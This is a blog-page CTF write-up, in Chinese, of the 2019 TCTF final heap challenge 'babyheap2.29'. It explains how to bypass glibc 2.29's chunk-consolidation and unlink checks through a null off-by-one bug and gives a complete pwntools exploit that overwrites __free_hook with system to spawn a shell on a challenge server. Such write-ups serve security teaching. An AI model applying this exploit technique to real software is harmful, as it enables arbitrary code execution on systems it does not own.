</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/10/2019-TCTF-final-babyheap2-29/">2019-TCTF(final)-babyheap2.29</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/libc-2-29/">libc-2.29</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/chunk-overlapping/">chunk overlapping</a></span><div class="content"><h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><p>&#x7A0B;&#x5E8F;&#x7ED9;&#x4E86;libc&#xFF0C;&#x7248;&#x672C;&#x662F;&#x6700;&#x65B0;&#x7248;&#x7684;2.29&#xFF0C;&#x5728;&#x539F;&#x6709;&#x7684;&#x5806;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x9650;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x5806;&#x91CD;&#x53E0;&#xFF0C;tcache&#x7684;&#x5F31;&#x68C0;&#x6D4B;</p>
<p>&#x5148;&#x770B;&#x4E0B;&#x7A0B;&#x5E8F;&#x5F00;&#x542F;&#x7684;&#x4FDD;&#x62A4;&#xFF1A;</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Arch:</span>     amd64<span class="number">-64</span>-little</span><br><span class="line"><span class="symbol">RELRO:</span>    Full RELRO</span><br><span class="line"><span class="symbol">Stack:</span>    Canary found</span><br><span class="line"><span class="symbol">NX:</span>       NX enabled</span><br><span class="line"><span class="symbol">PIE:</span>      PIE enabled</span><br></pre></td></tr></table></figure>
<p>&#x5F00;&#x542F;&#x4E86;&#x5168;&#x4FDD;&#x62A4;&#x3002;</p>
<p>&#x518D;&#x770B;&#x4E0B;&#x7A0B;&#x5E8F;&#x7684;&#x529F;&#x80FD;&#xFF1A;</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    __ __ _____________   __   __    ___    ____</span><br><span class="line">   <span class="regexp">/ /</span><span class="regexp">/_/</span><span class="regexp">/ ____/</span> ____<span class="regexp">/ | /</span> <span class="regexp">/  /</span> <span class="regexp">/   /</span>   |  / __ )</span><br><span class="line">  <span class="regexp">/ ,&lt;  /</span> __<span class="regexp">/ /</span> __<span class="regexp">/ /</span>  |<span class="regexp">/ /</span>  <span class="regexp">/ /</span>   <span class="regexp">/ /</span>| | / __  |</span><br><span class="line"> <span class="regexp">/ /</span>| |<span class="regexp">/ /</span>___<span class="regexp">/ /</span>___<span class="regexp">/ /</span>|  <span class="regexp">/  /</span> <span class="regexp">/___/</span> ___ |<span class="regexp">/ /</span>_<span class="regexp">/ /</span></span><br><span class="line"><span class="regexp">/_/</span> |_<span class="regexp">/_____/</span>_____<span class="regexp">/_/</span> |_<span class="regexp">/  /</span>_____<span class="regexp">/_/</span>  |_<span class="regexp">/_____/</span></span><br><span class="line"></span><br><span class="line">===== Baby Heap <span class="number">2.29</span> =====</span><br><span class="line"><span class="number">1.</span> Allocate</span><br><span class="line"><span class="number">2.</span> Update</span><br><span class="line"><span class="number">3.</span> Delete</span><br><span class="line"><span class="number">4.</span> View</span><br><span class="line"><span class="number">5.</span> Exit</span><br><span class="line"><span class="string">Command:</span></span><br></pre></td></tr></table></figure>
<p>&#x6F0F;&#x6D1E;&#x70B9;&#x5728;Update&#x529F;&#x80FD;&#xFF0C;&#x5B58;&#x5728;&#x4E00;&#x4E2A;null off by one</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">v3</span> = <span class="number">0</span>LL<span class="comment">;</span></span><br><span class="line">  <span class="meta">while</span> ( <span class="built_in">v3</span> &lt; <span class="built_in">a2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">v4</span> = read(<span class="number">0</span>, (void *)(<span class="built_in">v3</span> + <span class="built_in">a1</span>), <span class="built_in">a2</span> - <span class="built_in">v3</span>)<span class="comment">;</span></span><br><span class="line">    <span class="meta">if</span> ( <span class="built_in">v4</span> &gt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">v3</span> += <span class="built_in">v4</span><span class="comment">;</span></span><br><span class="line">    }</span><br><span class="line">    <span class="meta">else</span> <span class="meta">if</span> ( *__errno_location() != <span class="number">11</span> &amp;&amp; *__errno_location() != <span class="number">4</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">break;</span></span><br><span class="line"><span class="keyword"> </span>   }</span><br><span class="line">  }</span><br><span class="line">  *(_BYTE *)(<span class="built_in">a1</span> + <span class="built_in">v3</span>) = <span class="number">0</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x4F1A;&#x901A;&#x8FC7;mmap&#x968F;&#x673A;&#x5730;&#x5740;&#x5206;&#x914D;0x1000&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7136;&#x540E;&#x7A0B;&#x5E8F;Allocate&#x529F;&#x80FD;&#x4F1A;&#x5728;&#x8BE5;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x7684;&#x968F;&#x673A;&#x4F4D;&#x7F6E;&#x5199;&#x5165;&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>{</span></span><br><span class="line">  <span class="keyword">int</span> flag;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="keyword">int</span> *ptr</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x7A0B;&#x5E8F;delete&#x529F;&#x80FD;&#x4F1A;&#x4E0A;&#x8FF0;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#x6E05;&#x7A7A;&#x3002;</p>
<h2 id="0x01-&#x5229;&#x7528;&#x5206;&#x6790;"><a href="#0x01-&#x5229;&#x7528;&#x5206;&#x6790;" class="headerlink" title="0x01 &#x5229;&#x7528;&#x5206;&#x6790;"></a>0x01 &#x5229;&#x7528;&#x5206;&#x6790;</h2><p>&#x6240;&#x4EE5;&#x80FD;&#x591F;&#x5229;&#x7528;&#x7684;&#x70B9;&#x5C31;&#x662F;&#x90A3;&#x4E2A;null off by one&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x4F7F;&#x7528;chunk overlapping&#x65F6;&#xFF0C;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;chunk extend&#xFF0C;&#x4FEE;&#x6539;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;prev_size&#xFF0C;&#x63A5;&#x7740;&#x53BB;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#xFF0C;&#x4F7F;&#x4E4B;&#x5408;&#x5E76;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x9020;&#x6210;chunk overlapping&#xFF1B;&#x53E6;&#x4E00;&#x4E2A;&#x662F;chunk shrink&#xFF0C;&#x4FEE;&#x6539;&#x5F53;&#x524D;free&#x72B6;&#x6001;&#x4E0B;chunk&#x7684;size&#xFF0C;&#x4F7F;malloc&#x65F6;&#xFF0C;glibc&#x4E0D;&#x80FD;&#x51C6;&#x786E;&#x5B9A;&#x4F4D;&#x4E0B;&#x4E00;&#x4E2A;chunk&#x7684;&#x4F4D;&#x7F6E;&#x6765;&#x4FEE;&#x6539;&#x5176;prev_size&#xFF0C;&#x63A5;&#x7740;&#x540C;&#x6837;&#x53BB;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#xFF0C;&#x4F7F;&#x4E4B;&#x5408;&#x5E76;&#x8FC7;&#x591A;&#x7684;&#x5185;&#x5B58;&#xFF0C;&#x9020;&#x6210;chunk overlapping&#x3002;</p>
<p>&#x4F46;&#x662F;2.29&#x7684;libc&#x52A0;&#x5165;&#x4E86;&#x4EE5;&#x4E0B;&#x7684;&#x68C0;&#x6D4B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) {</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x5411;&#x540E;&#x5408;&#x5E76;&#x65F6;&#xFF0C;&#x5B83;&#x4F1A;&#x68C0;&#x6D4B;&#x5F85;&#x5408;&#x5E76;chunk&#x7684;size&#xFF0C;&#x4E0E;&#x5F53;&#x524D;chunk&#x7684;prev_size&#x662F;&#x5426;&#x76F8;&#x540C;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x56E0;&#x6B64;&#x4E0A;&#x8FF0;&#x7684;&#x4E24;&#x79CD;&#x529E;&#x6CD5;&#x5C31;&#x4F1A;&#x5931;&#x6548;&#x3002;</p>
<h3 id="&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2-29&#x4E0B;&#x7684;chunk-overlapping"><a href="#&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2-29&#x4E0B;&#x7684;chunk-overlapping" class="headerlink" title="&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2.29&#x4E0B;&#x7684;chunk overlapping"></a>&#x7ED5;&#x8FC7;&#x68C0;&#x6D4B;&#xFF0C;&#x5B9E;&#x73B0;libc2.29&#x4E0B;&#x7684;chunk overlapping</h3><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x4F2A;&#x9020;&#x5F85;&#x5408;&#x5E76;chunk&#x7684;head&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#xFF0C;&#x7EFF;&#x8272;&#x90E8;&#x5206;&#x662F;&#x6211;&#x4F2A;&#x9020;&#x662F;&#x6570;&#x636E;</p>
<p><img src="/2019/06/10/2019-TCTF-final-babyheap2-29/image-20190613135826757.png" alt="image-20190613135826757"></p>
<p>&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x89E6;&#x53D1;&#x5411;&#x540E;&#x5408;&#x5E76;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;&#x4E0A;&#x8FF0;&#x7684;&#x68C0;&#x6D4B;&#xFF0C;&#x4F46;&#x662F;unlink&#x65F6;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x94FE;&#x8868;&#x68C0;&#x6D4B;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x6784;&#x9020;fd&#x3001;bk&#xFF0C;&#x56E0;&#x6B64;&#x8FD8;&#x9700;&#x8981;&#x4F2A;&#x9020;&#x4E00;&#x4E2A;&#x6307;&#x5411;&#x8BE5;chunk&#x7684;&#x6307;&#x9488;(&#x9700;&#x8981;&#x6CC4;&#x9732;&#x5806;&#x6307;&#x9488;)&#xFF0C;&#x6700;&#x540E;&#x6784;&#x9020;&#x6570;&#x636E;&#x5982;&#x4E0B;</p>
<p><img src="/2019/06/10/2019-TCTF-final-babyheap2-29/image-20190614094206536.png" alt="image-20190614094206536"></p>
<p>&#x5B9E;&#x9645;chunk A&#x7684;&#x5E03;&#x5C40;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x<span class="number">558216406d40</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x0000<span class="number">000000000101</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d50</span>:	<span class="number">0</span>x0000<span class="number">558216406d60</span>	<span class="number">0</span>x00000<span class="number">00000000000</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d60</span>:	<span class="number">0</span>x00000<span class="number">00000000000</span>	<span class="number">0</span>x000000<span class="number">00000001e1</span></span><br><span class="line"><span class="number">0</span>x<span class="number">558216406d70</span>:	<span class="number">0</span>x0000<span class="number">558216406d38</span>	<span class="number">0</span>x0000<span class="number">558216406d40</span></span><br></pre></td></tr></table></figure>
<p>&#x7ED5;&#x8FC7;&#x94FE;&#x8868;&#x68C0;&#x6D4B;&#xFF0C;&#x6210;&#x529F;&#x5B9E;&#x73B0;chunk overlapping</p>
<p>&#x5173;&#x4E8E;&#x6CC4;&#x9732;libc&#x5730;&#x5740;&#x548C;&#x5806;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x4E3A;&#x7A0B;&#x5E8F;&#x6709;&#x8F93;&#x51FA;&#x529F;&#x80FD;&#xFF0C;&#x5F53;chunk&#x7531;free&#x72B6;&#x6001;&#x53D8;&#x4E3A;allocate&#x72B6;&#x6001;&#x540E;&#xFF0C;&#x5176;&#x5185;&#x5B58;&#x4E0D;&#x4F1A;&#x88AB;&#x6E05;&#x7A7A;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5176;&#x5305;&#x542B;libc&#x5730;&#x5740;&#x548C;&#x5806;&#x5730;&#x5740;&#x7684;fd&#x3001;bk&#x6307;&#x9488;&#x4E0D;&#x4F1A;&#x88AB;&#x6E05;&#x9664;&#xFF0C;&#x76F4;&#x63A5;&#x8F93;&#x51FA;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;</p>
<h2 id="0x02-EXP"><a href="#0x02-EXP" class="headerlink" title="0x02 EXP"></a>0x02 EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&apos;./babyheap2.29&apos;</span>)</span><br><span class="line">    main_arena_off= <span class="number">0x3EBC40</span></span><br><span class="line">    <span class="comment">#malloc_hook_off = 0x3ebc30</span></span><br><span class="line">    free_hook_off = <span class="number">0x3ed8e8</span></span><br><span class="line">    <span class="comment">#one_off = 0x10a38c</span></span><br><span class="line">    system_off = <span class="number">0x4f440</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&apos;192.168.201.21&apos;</span>,<span class="number">1904</span>)</span><br><span class="line">    <span class="comment">#p = process([&apos;./lib/ld-2.29.so&apos;,&apos;--library-path&apos;,&apos;./lib&apos;,&apos;./babyheap2.29&apos;])</span></span><br><span class="line">    main_arena_off= <span class="number">0x1E4C40</span></span><br><span class="line">    <span class="comment">#malloc_hook_off = 0x1e4c30</span></span><br><span class="line">    free_hook_off = <span class="number">0x1e75a8</span></span><br><span class="line">    system_off = <span class="number">0x52fd0</span></span><br><span class="line">    <span class="comment">#one_off = 0xe237f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &apos;debug&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">&apos;test&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;1&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="comment">#p.recvuntil(&apos;Allocated&apos;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;2&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Size: &apos;</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Content: &apos;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Deleted&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;4&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_7_times</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_7_times</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start,end+<span class="number">1</span>):</span><br><span class="line">        dele(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    add_7_times(<span class="number">0x80</span>)<span class="comment">#0-6</span></span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xf8</span>) <span class="comment">#7 chunkA</span></span><br><span class="line">    add(<span class="number">0xf8</span>) <span class="comment">#8 chunkB</span></span><br><span class="line">    add(<span class="number">0xf0</span>) <span class="comment">#9 chunkC</span></span><br><span class="line">    add(<span class="number">0xf0</span>) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x200</span>) <span class="comment">#11</span></span><br><span class="line">    edit(<span class="number">11</span>,<span class="number">8</span>,<span class="string">&apos;/bin/sh\x00&apos;</span>)</span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#malloc 7 8 9 10</span></span><br><span class="line">    dele(<span class="number">7</span>)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xf8</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0xf8</span>)<span class="comment">#8</span></span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;: &apos;</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>))-main_arena_off<span class="number">-0x250</span></span><br><span class="line">    free_hook = libc_base + free_hook_off</span><br><span class="line">    system = libc_base+system_off</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;: &apos;</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>)) - <span class="number">0xb50</span></span><br><span class="line">    log.info(<span class="string">&apos;heap_base: &apos;</span>+hex(heap_base))</span><br><span class="line">    main_arena = libc_base + main_arena_off</span><br><span class="line">    log.info(<span class="string">&apos;libc_base: &apos;</span>+hex(libc_base))</span><br><span class="line">    log.info(<span class="string">&apos;main_arena: &apos;</span>+hex(main_arena))</span><br><span class="line">    dele_7_times(<span class="number">0</span>,<span class="number">6</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#malloc 7-11</span></span><br><span class="line">    chunkA = heap_base + <span class="number">0xd50</span></span><br><span class="line">    edit(<span class="number">7</span>,<span class="number">0x30</span>,p64(chunkA+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x1e1</span>)+p64(chunkA<span class="number">-0x18</span>)+p64(chunkA<span class="number">-0x10</span>))</span><br><span class="line">    edit(<span class="number">8</span>,<span class="number">0xf8</span>,<span class="string">&apos;a&apos;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x1e0</span>))</span><br><span class="line">  </span><br><span class="line">    dele(<span class="number">9</span>)</span><br><span class="line">    add_7_times(<span class="number">0xf0</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0xd0</span>)<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#12</span></span><br><span class="line">    dele(<span class="number">12</span>) </span><br><span class="line">    edit(<span class="number">8</span>,<span class="number">16</span>,p64(free_hook)+p64(<span class="number">0</span>))</span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#12</span></span><br><span class="line">    add(<span class="number">0xf0</span>)<span class="comment">#13</span></span><br><span class="line">    edit(<span class="number">13</span>,<span class="number">8</span>,p64(system))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&apos;Command: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;3&apos;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&apos;Index: &apos;</span>)</span><br><span class="line">    p.sendline(<span class="string">&apos;11&apos;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/Po1lux/Po1lux.github.io/hexo/source/images/IMG_3035.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Po1lux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>